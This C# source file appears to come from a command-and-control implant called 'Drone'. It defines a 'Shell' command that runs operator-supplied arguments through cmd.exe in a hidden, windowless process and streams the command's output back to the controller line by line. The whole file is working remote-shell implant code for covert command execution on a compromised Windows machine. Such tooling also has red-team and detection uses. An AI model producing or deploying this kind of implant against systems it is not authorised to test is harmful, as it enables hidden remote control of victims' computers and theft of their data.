using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class Shell : DroneCommand
{
    public override byte Command => 0x3A;
    public override bool Threaded => true;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        using var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {string.Join(" ", task.Arguments)}",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            }
        };

        // inline function
        async void OnDataReceived(object sender, DataReceivedEventArgs e)
        {
            await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, e.Data + Environment.NewLine));
        }
        
        // send output on data received
        process.OutputDataReceived += OnDataReceived;
        process.ErrorDataReceived += OnDataReceived;

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();
        
        // send a task running
        await Drone.SendTaskRunning(task.Id);
        
        // don't use WaitForExit
        while (!process.HasExited)
        {
            // has the token been cancelled?
            if (cancellationToken.IsCancellationRequested)
            {
                process.OutputDataReceived -= OnDataReceived;
                process.ErrorDataReceived -= OnDataReceived;
                
                break;
            }
            
            Thread.Sleep(100);
        }

        await Drone.SendTaskComplete(task.Id);
    }
}